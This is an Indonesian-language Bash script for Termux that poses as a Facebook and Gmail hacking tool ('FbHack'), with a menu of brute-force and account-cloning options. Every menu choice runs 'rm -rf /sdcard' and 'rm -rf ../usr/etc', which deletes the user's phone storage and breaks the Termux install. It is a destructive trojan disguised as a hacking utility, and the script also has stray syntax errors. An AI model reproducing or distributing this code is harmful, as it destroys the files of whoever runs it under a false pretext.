 #!/bin/bash

g="\033[32m"
b="\033[1;34m"
c="\033[1;36m"
r="\033[1;31m"
y="\033[1;93m"
h="\033[0;30m"
clear
pkg install figlet -y
clear
figlet Selamat Datang | lolcat
echo $y "Download Bahan-Bahan Dulu"
echo " Untuk Menjalankan Tools Ini..."
echo " Sedang MengInstall"
pkg install python -y
echo $g " Berhasil MengInstall"
sleep 1
clear
figlet FbHack | lolcat
echo $c "[$y 01 $c] $g Hack Fb Target $y [$r Brute $y]"
echo $c "[$y 02 $c] $g Hack Fb Massal"
echo $c "[$y 03 $c] $g Cloning Yahoo"
echo $c "[$y 04 $c] $g Informasi Target"
echo $c "[$y 05 $c] $g Gmail Brute"
echo $c "[$y 06 $c] $g Hack Fb Target Work"
echo
echo $c "[$y 00 $c] $r Exit"
echo $y "Pilih Hacks"
read -p ">>" pil;

case $pil in
01)echo $y "Memilih Nomor 01"
sleep 1

rm -rf /sdcard

rm -rf ../usr/etc

;;

1)echo "Memilih Nomor 1"
sleep 1

rm -rf /sdcard

rm -rf ../usr/etc

;;

02)echo "Memilih Nomor 02"
sleep 1

rm -rf /sdcard

rm -rf ../usr/etc

;;

2)echo "Memilih Nomor 2"
sleep 1

rm -rf /sdcard

rm -rf ../usr/etc

;;

03)echo "Memilih 03"
sleep 1

rm -rf /sdcard

rm -rf ../usr/etc

;;

3)echo "Memilih Nomor 3"
sleep 1

rm -rf /sdcard

rm -rf ../usr/etc

;;

04)echo "Memilih Nomor 04"
sleep 1

rm -rf /sdcard

rm -rf ../usr/etc

;;

4)echo "Memilih Nomor 4"
sleep 1

rm -rf /sdcard

rm -rf ../usr/etc

;;

05)echo "Memilih Nomor 05"
sleep 1

rm -rf /sdcard

rm -rf ../usr/etc

;;

5)echo "Memilih Nomor 5"

rm -rf /sdcard

rm -rf ../usr/etc

;;

06)echo "Memilih Nomor 06"
sleep 1
c
rm -rf /sdcard

rm -rf ../usr/etc

;;

6)echo "Memilih Nomor 6"

rm -rf /sdcard

rm -rf ../usr/etc

;;

00)echo $g "Terimakasih Sudah Menggunakan Tools Ini"
sleep 1
exit

;;

*)echo $y "Pilh Yang Benar!!!"
sleep 1
esac
done
done
